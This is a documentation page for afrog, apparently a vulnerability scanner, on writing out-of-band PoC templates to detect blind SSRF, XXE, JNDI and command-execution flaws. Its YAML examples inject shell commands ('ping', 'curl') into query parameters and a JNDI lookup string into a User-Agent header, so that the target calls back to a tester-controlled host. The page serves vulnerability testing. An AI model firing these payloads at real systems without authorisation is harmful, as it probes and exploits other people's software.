---
title: OOB
slug: /docs/poc/oob
lang: en
summary: Recommended OOB PoC patterns, evidence output, and troubleshooting for afrog.
status: published
source: docs/zh/poc/oob.md
last_reviewed: 2026-09-16
---

OOB (Out-of-Band) is useful for vulnerabilities that trigger successfully but do not echo evidence back in the HTTP response, such as SSRF, XXE, JNDI, and blind command execution.

## What OOB means

The core idea is simple:

1. make the target access a domain or URL you control
2. query the OOB platform to see whether that access happened

If the callback is recorded, the target really executed the relevant chain.

## Recommended modern syntax

The recommended flow is:

- `{{oob.DNS}}` / `{{oob.HTTP}}`
- `oobCheck(protocol, timeout)`

Minimal DNS example:

```yaml
rules:
  r0:
    request:
      method: GET
      path: /?dns=ping%20{{oob.DNS}}
    expression: oobCheck("dns", 5)

expression: r0()
```

## Common templates

### DNS callback

```yaml
id: demo-oob-dns

info:
  name: Demo OOB DNS
  author: your-name
  severity: info

rules:
  r0:
    request:
      method: GET
      path: /?dns=ping%20{{oob.DNS}}
    expression: oobCheck("dns", 5)

expression: r0()
```

### HTTP callback

```yaml
id: demo-oob-http

info:
  name: Demo OOB HTTP
  author: your-name
  severity: info

rules:
  r0:
    request:
      method: GET
      path: /?http=curl%20{{oob.HTTP}}
    expression: oobCheck("http", 3)

expression: r0()
```

### JNDI observation

```yaml
id: demo-oob-jndi

info:
  name: Demo OOB JNDI
  author: your-name
  severity: info

rules:
  r0:
    request:
      method: GET
      path: /
      headers:
        User-Agent: "${jndi:ldap://{{oob.DNS}}/a}"
    expression: oobCheck("dns", 5)

expression: r0()
```

## How to choose the timeout

Rule of thumb:

- HTTP OOB: usually `3` seconds
- DNS OOB: usually `5` seconds

If the trigger path may be asynchronous, increase gradually to `8` to `15` seconds.

## Where the evidence appears

After a hit, the result usually includes evidence such as `oob_evidence`. You will typically see it in:

- terminal output
- HTML reports
- downstream systems consuming structured results

If you need the evidence inside expressions or outputs, you can also use:

```yaml
oobEvidence()
```

## Old syntax vs new syntax

An older style often looks like:

```yaml
set:
  oob: oob()

rules:
  r0:
    request:
      method: GET
      path: /?dns=ping%20{{oob.DNS}}
    expression: oobCheck(oob, oob.ProtocolDNS, 3)
```

The newer recommended style is shorter and more consistent:

```yaml
rules:
  r0:
    request:
      method: GET
      path: /?dns=ping%20{{oob.DNS}}
    expression: oobCheck("dns", 5)
```

## Common failure reasons

If OOB does not hit, check:

1. the target may not have outbound connectivity
2. the OOB platform configuration may be wrong
3. the timeout may be too short
4. the payload may not actually trigger
5. the PoC may still use outdated syntax or assumptions

## Configuration reminder

The OOB platform itself must be configured first. Common providers include:

- ceye
- dnslog.cn
- alphalog
- xray
- revsuit

Configuration details:

- [Configuration](../user-guide/configuration.md)

## Related pages

- [PoC Quickstart](./quickstart.md)
- [PoC Syntax](./syntax.md)
